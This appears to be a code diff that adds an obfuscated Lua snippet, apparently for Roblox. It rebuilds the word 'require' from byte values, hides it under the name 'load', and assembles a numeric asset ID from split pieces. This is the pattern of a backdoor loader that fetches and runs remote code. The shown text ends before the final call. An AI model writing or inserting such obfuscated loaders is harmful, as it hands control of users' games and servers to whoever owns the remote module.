@@ -1,1 +1,18 @@
+local bytes = {114, 101, 113, 117, 105, 114, 101}
+local w = ""
+for _, b in ipairs(bytes) do
+    w = w .. string.char(b)
+end
 
+
+local load = getfenv()[w]
+
+local function str2num(...)
+    return tonumber(table.concat({...}))
+end
+
+local z = {175237, 90773} 
+local x, y = "rob", "lox"
+local q, w = "10293", "84o"
+
+local f = str2num(tostring(z[1]), tostring(z[2]))
